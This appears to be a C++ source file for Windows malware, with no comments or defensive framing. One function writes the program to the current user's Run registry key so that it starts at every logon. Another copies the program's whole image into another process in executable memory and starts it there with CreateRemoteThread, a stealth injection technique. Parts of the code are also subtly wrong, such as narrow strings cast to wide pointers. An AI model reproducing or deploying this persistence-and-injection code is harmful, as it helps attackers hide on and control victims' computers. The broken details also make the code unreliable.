#include <windows.h>
#include "Config.h"

BOOL RegisterStartup(PCWSTR pszAppName, PCWSTR pathToExe, PCWSTR args) {
	HKEY hKey = NULL;
	LONG lResult = 0;
	BOOL fSuccess = TRUE;
	DWORD dwSize;

	const size_t count = MAX_PATH * 2;
	wchar_t szValue[count] = {};


	wcscpy_s(szValue, count, L"\"");
	wcscat_s(szValue, count, pathToExe);
	wcscat_s(szValue, count, L"\" ");

	if (args != NULL) wcscat_s(szValue, count, args);
	lResult = RegCreateKeyExW(HKEY_CURRENT_USER, L"Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, NULL, 0, (KEY_WRITE | KEY_READ), NULL, &hKey, NULL);
	fSuccess = (lResult == 0);

	if (fSuccess) {
		dwSize = (wcslen(szValue) + 1) * 2;
		lResult = RegSetValueExW(hKey, pszAppName, 0, REG_SZ, (BYTE*)szValue, dwSize);
		fSuccess = (lResult == 0);
	}
	if (hKey != NULL) {
		RegCloseKey(hKey);
		hKey = NULL;
	}
	return fSuccess;
}

void RegisterProgram() {
	wchar_t szPathToExe[MAX_PATH];
	GetModuleFileNameW(NULL, szPathToExe, MAX_PATH);
	RegisterStartup(autorun_name, szPathToExe, L"-foobar");
}

DWORD WINAPI func(LPVOID) {
	LoadLibrary((LPCWSTR)"kernel32.dll");
	LoadLibrary((LPCWSTR)"user32.dll");
	return true;
}

BOOL Inject(HANDLE hProc, DWORD(WINAPI* func)(LPVOID)) {
	DWORD id;
	SIZE_T ByteOfWriten;
	HMODULE hModule = GetModuleHandle(NULL);
	DWORD size = ((PIMAGE_OPTIONAL_HEADER)((LPVOID)((BYTE*)(hModule)+((PIMAGE_DOS_HEADER)(hModule))->e_lfanew + sizeof(DWORD) + sizeof(IMAGE_FILE_HEADER))))->SizeOfImage;
	char* hNewModule = (char*)VirtualAllocEx(hProc, hModule, size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
	if (hNewModule == NULL) return false;
	WriteProcessMemory(hProc, hNewModule, hModule, size, &ByteOfWriten);
	if (ByteOfWriten != size) return false;
	HANDLE hThread = CreateRemoteThread(hProc, NULL, 0, func, (LPVOID)hNewModule, 0, &id);
	if (hThread == 0) return false;
	return true;
}

